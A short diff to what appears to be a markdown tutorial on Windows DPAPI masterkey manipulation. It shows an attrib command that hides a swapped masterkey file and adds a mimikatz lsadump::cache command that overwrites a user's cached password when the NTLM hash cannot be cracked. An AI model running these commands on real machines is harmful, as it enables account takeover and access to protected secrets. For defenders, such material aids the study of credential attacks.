@@ -27,3 +27,5 @@
 #### 10) attrib "c:\users\USER\appdata\roaming\microsoft\protect\USER_SID\MASTERKEY" +S +H (Shuffle the old and new masterkey files, then give the same attributes to the newly created masterkey file as the old one)
 
 #### 11) VOILA!
+
+## TIP: In case we cannot crack the NTLM password of a user, we can simply create a new password with mimikatz: lsadump::cache /user:USER /password:NEW_PASSWORD /kiwi
